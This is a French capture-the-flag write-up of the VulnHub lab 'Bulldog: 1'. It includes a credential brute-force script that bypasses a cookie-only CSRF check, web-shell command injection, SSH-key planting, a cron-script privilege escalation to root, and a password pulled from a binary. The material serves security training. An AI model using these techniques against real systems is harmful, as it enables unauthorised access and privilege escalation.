# Solution du CTF Bulldog: 1 de VulnHub

Présentation
------------

[Bulldog: 1](https://www.vulnhub.com/entry/bulldog-1,211/) est une VM disponible sur *VulnHub* est créée par [Nick Frichette](https://twitter.com/frichette_n) ([frichetten.com](http://frichetten.com/)).  

Le scénario est le suivant : l'entreprise *Bulldog Industries* spécialisée dans la production de photos de bulldogs en haute qualité a été la victime d'une attaque sous-disant APT (qui ne serait en fait que l'exploitation d'un CMS suivi d'une escalade de privilèges via un exploit [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW).  

L'objectif de ce CTF qui est un boot-2-root est (en dehors d'obtenir un accès root) de vérifier si les employés de Bulldog ont fait leur travail de récupération et de sécurisation du serveur.
Toutefois il ne s'agit pas d'un challenge d'inforensique, mais plus d'un pentest.  

Reconnaissance et énumération
-----------------------------

On lance un scan rapide du serveur qui nous indique la présence d'un serveur web ainsi qu'un serveur SSH (mais écoutant sur le port 23).  

```plain
$ sudo nmap -T5 --open 192.168.3.190

Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-14 14:23 CEST
Nmap scan report for 192.168.3.190
Host is up (0.0011s latency).
Not shown: 997 closed ports, 1 filtered port
PORT   STATE SERVICE
23/tcp open  telnet
80/tcp open  http
MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.87 seconds
```

La page d'index est une notice d'information informant du hack récent. La note est signée *Wiston Churchy* qui est le CEO de Bulldog.  

Afin de trouver d'autres URLs je lance mon script maison *brute\_web* (qu'il faut que je mette au propre et que je release) afin de découvrir la présence d'autres dossiers sur le serveur :

```plain
$ python2 brute_web.py -u http://192.168.3.190/ -w /opt/dirb222/wordlists/big.txt
  `==\. dvbuster v1.0 ./=='
        ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
20468 lines to process.
as many requests to send.
Using 4 processes...
Server banner: WSGIServer/0.1 Python/2.7.12

Starting buster processes...
http://192.168.3.190/admin/ - HTTP 302 (0 bytes, plain) redirects to http://192.168.3.190/admin/login/?next=/admin/
http://192.168.3.190/dev/ - HTTP 200 (3540 bytes, plain)
http://192.168.3.190/notice/ - HTTP 200 (1622 bytes, plain)
100% - DONE
Duration: 0:00:46.388938
```

Sur /dev/ on trouve un message intéressant de la part d'un certain *Alan Brooke*, nouveau chef des développeurs, qui informe sa nouvelle team sur les changements demandés par le CEO : fini les CMS et PHP, place à du Django maison, du MongoDB à venir et un soit disant antivirus commandé qui tournerait toutes les minutes (ça sent la tache CRON...)  

Dans cette page on trouve aussi différents noms de contacts de la team dev que l'on garde de côté pour en faire une wordlist.  

![List of contacts from Bulldog Industries website](https://raw.githubusercontent.com/devl00p/blog/master/images/bulldog1/contacts.png)  

Enfin on trouve un lien vers un web shell mais ce dernier nous répond *"Please authenticate with the server to use Web-Shell".*  

Après avoir essayé de passer quelques noms de paramètres évidents (username, user, login, etc) force est de constater que ce n'est pas par là qu'il faut passer.  

Sous /admin/, l'autre URL trouvée, une mire de login marquée Django nous fait de l’œil.  

![Django based login page](https://raw.githubusercontent.com/devl00p/blog/master/images/bulldog1/django_admin.png)  

On remarque dans le code HTML que le formulaire a un champ anti Cross Site Request Forgery mais après plusieurs essais avec les developer tools ouvertes on voit bien que la valeur du champ ne change pas du moment que la session est ouverte.  

Pire : il semble que le token anti-CSRF est juste conservé comme cookie et que le formulaire compare uniquement la valeur passée par formulaire avec la valeur passée par cookie (pas de stockage côté serveur donc).  

Let me in
---------

Il suffit alors d'écrire un petit outil de force brute qui spécifie pour chaque tentative de login un cookie et un champ anti-csrf identique (ici forcé à "lol").  

```python
import requests
from bs4 import BeautifulSoup

users = set()
with open("users.txt") as fd:
    for line in fd:
        user = line.strip()
        if user:
            users.add(user.lower())

sess = requests.session()

for user in sorted(users):
    print("Trying user {}".format(user))

    with open("passlist.txt") as fd:
        for line in fd:
            password = line.strip()
            if not password:
                continue

            response = sess.post(
                    "http://192.168.3.190/admin/login/", 
                    data={
                        "username": user,
                        "password": password,
                        "csrfmiddlewaretoken": "lol"
                    },
                    headers={"Cookie": "csrftoken=lol"}
            )

            if "Please enter the correct username and password for a staff account." not in response.text:
                print("Found creds {} / {}".format(user, password))
                sess = requests.session()
```

On lui donne notre liste de logins potentiels basés sur les noms trouvés dans /dev/ ainsi qu'une liste de passwords potentiels (mots de passes classiques + les logins + le nom de la société).  

On trouve rapidement un compte faillible.  

```plain
Trying user alan
Trying user alan brooke
Trying user alan.brooke
Trying user ashley
Trying user brooke
Trying user churchy
Trying user kevin
Trying user malik
Trying user nick
Found creds nick / bulldog
Trying user sarah
Trying user william
Trying user winston
Trying user winston churchy
Trying user winston.churchy
```

Une fois les credentials utilisés sur /admin/ (qui ne fournit rien d'intéressant) on retourne sur /dev/ et le web-shell.  

Force est de constater que celui-ci réutilise la session de l'interface d'administration.  

![Command injection on Bulldog:1 CTF web-shell](https://raw.githubusercontent.com/devl00p/blog/master/images/bulldog1/shell_injection.png)  

On a affaire à une classique faille d'injection de commande. J'ai utilisé les backticks mais on peut parier que d'autres techniques fonctionnent.  

On a les privilèges de l'utilisateur django et un SSH est accessible... Il faut pas chercher longtemps avant de rajouter notre clé publique SSH dans le fichier */home/django/.ssh/authorized\_keys* via la commande echo.  

G0t r00t?
---------

Une fois le shell récupéré on part à la recherche du fameux antivirus qui tourne toutes les minutes.  

```plain
django@bulldog:~/bulldog$ ls /etc/cron.d
mdadm  popularity-contest  runAV
django@bulldog:~/bulldog$ cat /etc/cron.d/runAV
*/1 * * * * root /.hiddenAVDirectory/AVApplication.py
django@bulldog:~/bulldog$ cat /.hiddenAVDirectory/AVApplication.py
#!/usr/bin/env python

# Just wanted to throw this placeholder here really quick.
# We will put the full AV here when the vendor is done making it.
# - Alan
django@bulldog:~/bulldog$ ls -al /.hiddenAVDirectory/AVApplication.py
-rwxrwxrwx 1 root root 157 Aug 25 22:12 /.hiddenAVDirectory/AVApplication.py
```

Hahaha la bonne blague, un fichier world-writable lancé par root :p  

Il y a bien des manières de récupérer l'accès root via l'édition du fichier mais j'ai opté pour la copie du *authorized\_keys* de *django* vers *root*.  

```python
#!/usr/bin/env python

# Just wanted to throw this placeholder here really quick.
# We will put the full AV here when the vendor is done making it.
# - Alan
import os
if not os.path.exists("/root/.ssh"):
        os.system("mkdir /root/.ssh")
        os.system("cp /home/django/.ssh/authorized_keys /root/.ssh/")
```

J'aurais pu utiliser + de la lib standard de Python mais j'ai eu la flemme de regarder dans la doc si *os.mkdir* prend des permissions à la *chmod* ou à la *umask* :D donc *os.system* FTW !  

Il ne nous reste que le fameux flag :  

```plain
root@bulldog:~# cat congrats.txt
Congratulations on completing this VM :D That wasn't so bad was it?

Let me know what you thought on twitter, I'm @frichette_n

As far as I know there are two ways to get root. Can you find the other one?

Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
```

Nota bene
---------

Je n'ai pas croisé de Mongo ni dans les ports en écoute ni dans les process donc je ne suis pas allé plus loin de ce côté. Quand à l'interface d'admin utilisant Django les droits des utilisateurs sont stockés via une base sqlite3.
Une fois éditée pour rajouter nick en admin on voit que l'interface ne propose rien de plus que la gestion des utilisateurs (donc useless).  

Je n'ai pas fouillé plus loin pour la seconde façon de passer root, si jamais je la croise je mettrais l'article à jour.  

Edit -- fin alternative
-----------------------

Une fois l'accès au compte django obtenu on voit que l'on peut fouiller dans les fichiers de l'utilisateur bulldogadmin :  

```plain
django@bulldog:~$ ls /home/bulldogadmin/ -al
total 44
drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Oct 19 11:04 .
drwxr-xr-x 4 root         root         4096 Aug 24 18:16 ..
-rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24 17:39 .bash_logout
-rw-r--r-- 1 bulldogadmin bulldogadmin 3771 Aug 24 17:39 .bashrc
drwx------ 2 bulldogadmin bulldogadmin 4096 Aug 24 17:40 .cache
drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Sep 20 19:44 .hiddenadmindirectory
drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 24 22:18 .nano
-rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24 17:39 .profile
-rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 24 22:18 .selected_editor
-rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24 17:45 .sudo_as_admin_successful
-rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24 18:20 .wget-hsts

```

Dans le dossier caché *.hiddenadmindirectory* on trouve un fichier texte ainsi qu'un binaire ELF 64 bits non-strippé.  

Le contenu du fichier texte est le suivant :  

```plain
Nick,

I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!

It's great stuff! Once I'm finished with it, a hacker wouldn't even be able to reverse it! Keep in mind that it's still a prototype right now. I am about to get it working with the Django user account. I'm not sure how I'll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?

Let me know what you think of it!

-Ashley
```

Quand à l'exécutable *customPermissionApp* il n'a pas de droits d'exécution pour qui que ce soit donc il ne faut pas chercher à l'exploiter mais peut être contient-il un secret quelconque... Un strings nous donne quelques éléments :  

```plain
--- snip ---
__gmon_start__
GLIBC_2.4
GLIBC_2.2.5
UH-H
SUPERultH
imatePASH
SWORDyouH
CANTget
dH34%(
AWAVA
AUATL
[]A\A]A^A_
Please enter a valid username to use root privileges
        Usage: ./customPermissionApp <username>
sudo su root
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
--- snip ---
```

L'auteur du code comptait vraisemblablement que l'utilisateur à qui est destiné le programme (django d'après les notes) n'ait pas à rentrer lui-même son mot de passe lorsque la commande *sudo su root* est lancée et a donc placé un mot de passe dans le code probablement pour une future version.  

Le mot de passe en question est *SUPERultimatePASSWORDyouCANTget*. Il faut retirer les caractères H (0x48) qui correspondent en réalité à l'opcode de l'instruction assembleur mov :  

```asm
0x004005fc      e88ffeffff     call sym.imp.puts           ; int puts(const char *s)
0x00400601      bf69074000     mov edi, str.sudo_su_root   ; 0x400769 ; "sudo su root"
0x00400606      e8a5feffff     call sym.imp.system         ; int system(const char *string)
0x0040060b      48b853555045.  movabs rax, 0x746c755245505553
0x00400615      48894590       mov qword [local_70h], rax
0x00400619      48b8696d6174.  movabs rax, 0x5341506574616d69
0x00400623      48894598       mov qword [local_68h], rax
0x00400627      48b853574f52.  movabs rax, 0x756f7944524f5753
0x00400631      488945a0       mov qword [local_60h], rax
0x00400635      48b843414e54.  movabs rax, 0x746567544e4143
0x0040063f      488945a8       mov qword [local_58h], rax
```

Il suffit alors d'appeler sudo et de saisir le mot de passe :  

```plain
django@bulldog:~$ sudo id
[sudo] password for django:
uid=0(root) gid=0(root) groups=0(root)
```


*Published October 15 2017 at 09:41*